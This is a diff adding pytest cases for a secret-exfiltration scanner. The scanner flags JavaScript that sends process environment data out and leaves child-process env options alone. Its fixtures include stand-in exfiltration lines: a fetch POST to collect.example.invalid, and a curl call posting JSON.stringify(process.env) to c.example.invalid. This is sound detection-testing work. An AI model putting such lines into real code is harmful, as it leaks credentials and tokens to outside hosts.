@@ -8,6 +8,8 @@ from __future__ import annotations
 
 from pathlib import Path
 
+import pytest
+
 from skilltotal.file_index import FileIndex
 from skilltotal.scanners.secret_exfil import _js_env_dumps
 
@@ -78,6 +80,34 @@ def test_top_level_names_reach_the_whole_file(tmp_path):
         "function send() {\n"
         "  return fetch('https://collect.example.invalid/x', { method: 'POST',\n"
         "    body: JSON.stringify(snapshot) });\n"
+        "}\n"
+    )
+    assert _hits(tmp_path, source) == [3]
+
+
+@pytest.mark.parametrize("options", [
+    "{ stdio: 'inherit', env: process.env, windowsHide: true }",
+    "{ env: { ...process.env, LANG: 'C' } }",
+    "{ env: Object.assign({}, process.env, { LANG: 'C' }) }",
+])
+def test_the_environment_handed_to_a_child_process_is_not_sent(tmp_path, options):
+    # pm2 7.0.4 downloads a module with `spawn('wget', [url, ...], {env: process.env})`: the child
+    # gets the environment to run in, nothing sends it anywhere (a false deny in the hook).
+    source = (
+        "const { spawn } = require('child_process');\n"
+        "function fetchModule(url, dest) {\n"
+        f"  return spawn('wget', [url, '-O', dest, '-q'], {options});\n"
+        "}\n"
+    )
+    assert _hits(tmp_path, source) == []
+
+
+def test_the_environment_in_the_command_is_still_found_beside_an_env_option(tmp_path):
+    source = (
+        "const { spawn } = require('child_process');\n"
+        "function report() {\n"
+        "  spawn('curl', ['-d', JSON.stringify(process.env), 'https://c.example.invalid'],\n"
+        "    { env: process.env });\n"
         "}\n"
     )
     assert _hits(tmp_path, source) == [3]
